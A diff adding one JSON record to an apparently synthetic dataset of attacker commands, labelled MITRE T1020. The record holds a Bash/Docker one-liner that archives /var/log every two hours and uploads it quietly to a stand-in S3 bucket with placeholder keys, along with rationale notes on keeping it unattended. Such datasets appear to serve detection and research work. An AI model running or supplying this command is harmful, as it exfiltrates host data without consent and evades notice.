@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_s3 --network host -v /var/log:/data:ro -e AWS_ACCESS_KEY_ID=AKIAEXAMPLE -e AWS_SECRET_ACCESS_KEY=exampleSecretKey -e AWS_DEFAULT_REGION=us-east-1 amazon/aws-cli sh -c 'while true; do TS=$(date +%s); FILE=/tmp/logs_$TS.tgz; tar -C /data -cz . > \"$FILE\"; aws s3 cp --only-show-errors \"$FILE\" s3://hidden-bucket/$(hostname)/$TS.tgz && rm -f \"$FILE\"; sleep 7200; done'",
+  "explanation": "Automates exfiltration of logs to an S3 bucket using AWS CLI in a container, keeping output minimal and running in the background.",
+  "rationale_steps": [
+    "Uses docker to run aws-cli without installing on host",
+    "Archives data and uploads with suppressed output",
+    "Credentials provided via environment enable non-interactive operation",
+    "Loop enforces ongoing automated exfiltration"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-321fc7ed",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
